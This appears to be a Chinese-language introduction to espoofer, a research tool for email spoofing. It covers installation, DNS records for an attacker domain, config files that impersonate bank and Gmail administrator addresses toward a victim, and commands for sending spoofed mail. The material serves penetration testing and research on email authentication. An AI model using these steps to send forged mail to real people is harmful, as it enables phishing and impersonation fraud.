![](https://image.3001.net/images/20220120/1642670378_61e9292a99813b60b3419.jpeg!small)

## 关于espoofer

espoofer是一款功能强大的电子邮件系统安全检测工具，同时它也是一款电子邮件欺骗攻击测试工具。在该工具的帮助下，广大研究人员不仅可以轻松绕过SPF、DKIM和DMARC等与电子邮件安全相关的协议，而且还可以伪造DKIM签名。

除此之外，espoofer也是一个开源的安全测试工具，该工具支持绕过电子邮件系统中的SPF、DKIM和DMARC身份验证机制。值得一提的是，该工具能够帮助邮件服务器管理员和渗透测试人员检查目标电子邮件服务器和客户端是否容易受到电子邮件欺骗攻击，或者是否可能被滥用以发送欺骗电子邮件。

简而言之，espoofer在手，邮件系统安全无忧！

 **下图显示的是一次针对Gmail邮箱的欺骗攻击：**

![](https://image.3001.net/images/20220120/1642670388_61e9293446ff312e3b46c.png!small)

 **演示视频：** 【https://you*tu.be/xuKZpT0rsd0】

## 工具安装

首先，我们需要使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/chenjj/espoofer

接下来，还需要使用pip3安装好该工具所需的依赖组件：

    
    
    sudo pip3 install -r requirements.txt

注意：该工具的正常运行要求本地设备安装并配置好Python 3（>=3.7）环境。

## 工具使用

epsoofer提供了三种工作模式，服务器模式、客户端模式和手动模式。服务器模式下，epsoofer会以邮件服务器的形式运行；客户端模式下，epsoofer会以邮件客户端的形式运行；手动模式一般用于调试目的。下图显示的是三种模式以及对应的攻击者行为：

![](https://image.3001.net/images/20220120/1642670408_61e929484877cc64f29f9.png!small)

### 服务器模式

如需让epsoofer以服务器模式运行，首先我们要有一个IP地址（1.2.3.4），其输出端口为25，并且没有被ISP屏蔽；其次就是一个域名（attack.com）。

 **1、域名配置**

设置attack.com的DKIM公钥：

    
    
    selector._domainkey.attacker.com TXT  "v=DKIM1; k=rsa; t=y; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNjwdrmp/gcbKLaGQfRZk+LJ6XOWuQXkAOa/lI1En4t4sLuWiKiL6hACqMrsKQ8XfgqN76mmx4CHWn2VqVewFh7QTvshGLywWwrAJZdQ4KTlfR/2EwAlrItndijOfr2tpZRgP0nTY6saktkhQdwrk3U0SZmG7U8L9IPj7ZwPKGvQIDAQAB"

设置attack.com的SPF记录：

    
    
    attack.com TXT "v=spf1 ip4:1.2.3.4 +all"

 **2、在config.py中配置工具**

    
    
    config ={
    
    "attacker_site": b"attack.com", # attack.com
    
    "legitimate_site_address": b"admin@bank.com", # legitimate.com
    
    "victim_address": b"victim@victim.com", # victim@victim.com
    
    "case_id": b"server_a1", # server_a1
    
    }

我们可以使用-l参数来查看所有测试的case_id：

    
    
    python3 espoofer.py -l

 **3、运行工具并发送一封欺骗邮件**

    
    
    python3 espoofer.py

我们还可以在config.py中修改case_id，或在命令行工具中使用-id选项来测试不同的样例：

    
    
    python3 espoofer.py -id server_a1

### 客户端模式

要在客户端模式下运行epsoofer，我们需要在目标电子邮件服务上拥有一个帐户。比如说，下面的例子中attacker@gmail.com会尝试伪装成admin@gmail.com进行操作。

 **1、在config.py文件中配置espoofer**

    
    
    config ={
    
    "legitimate_site_address": b"admin@gmail.com",  
    
    "victim_address": b"victim@victim.com",
    
    "case_id": b"client_a1",
    
     
    
    "client_mode": {
    
    "sending_server": ("smtp.gmail.com", 587),  # SMTP sending serve ip and port
    
    "username": b"attacker@gmail.com", # Your account username and password
    
    "password": b"your_passward_here",
    
    },
    
    }

我们可以使用-l参数来查看所有测试的case_id：

    
    
    python3 espoofer.py -l

注意：其中的“sending_server”为SMTP发送服务器的地址，而不是接收服务器的地址。

 **2、运行工具并发送一封欺骗邮件**

    
    
    python3 espoofer.py -m c

我们可以在config.py中修改case_id，并重新运行，或者在命令行中使用-id参数进行修改：

    
    
    python3 espoofer.py -m c -id client_a1

### 手动模式

下面的命令将以手动模式运行espoofer：

    
    
    python3 espoofer.py -m m -helo attack.com -mfrom <m@attack.com> -rcptto <victim@victim.com> -data raw_msg_here -ip 127.0.0.1 -port 25

## 工具运行截图

![](https://image.3001.net/images/20220120/1642670489_61e9299998624f014fea5.png!small)

## 项目地址

 **espoofer：** 【[ _GitHub传送门_](https://github.com/chenjj/espoofer)】

## 参考资料

>  _https://you*tu.be/xuKZpT0rsd0_
>
> [ _https://arstechnica.com/tech-policy/2017/03/fbi-hints-that-hack-of-semi-> privileged-yahoo-employee-led-to-massive-> breach/_](https://arstechnica.com/tech-policy/2017/03/fbi-hints-that-hack-> of-semi-privileged-yahoo-employee-led-to-massive-breach/)
>
> [ _https://www.cbsnews.com/news/the-phishing-email-that-hacked-the-account-> of-john-podesta/_](https://www.cbsnews.com/news/the-phishing-email-that-> hacked-the-account-of-john-podesta/)
>
> [ _https://www.blackhat.com/us-20/briefings/schedule/#you-have-no-idea-who-> sent-that-email--attacks-on-email-sender-> authentication-19902_](https://www.blackhat.com/us-20/briefings/schedule/#you-> have-no-idea-who-sent-that-email--attacks-on-email-sender-> authentication-19902)
>
>  _https://www.you_ _*_ _tube.com/watch?v=ar_lVqkWcHk &list=PL--> A-gWJV1dJ19SyhkzklMC3C8ra1kK5-&index=5&t=30s&ab_channel=BlackHat_
>
> [ _https://www.jianjunchen.com/publication/composition-kills-a-case-study-> of-email-sender-> authentication/_](https://www.jianjunchen.com/publication/composition-kills-> a-case-study-of-email-sender-authentication/)
>
> [ _http://i.blackhat.com/USA-20/Thursday/us-20-Chen-You-Have-No-Idea-Who-> Sent-That-Email-18-Attacks-On-Email-Sender-> Authentication.pdf_](http://i.blackhat.com/USA-20/Thursday/us-20-Chen-You-> Have-No-Idea-Who-Sent-That-Email-18-Attacks-On-Email-Sender-> Authentication.pdf)
>
> [ _https://www.usenix.org/system/files/sec20fall_chen-> jianjun_prepub_0.pdf_](https://www.usenix.org/system/files/sec20fall_chen-> jianjun_prepub_0.pdf)
>
> [ _https://www.usenix.org/conference/usenixsecurity20/presentation/chen-> jianjun_](https://www.usenix.org/conference/usenixsecurity20/presentation/chen-> jianjun)

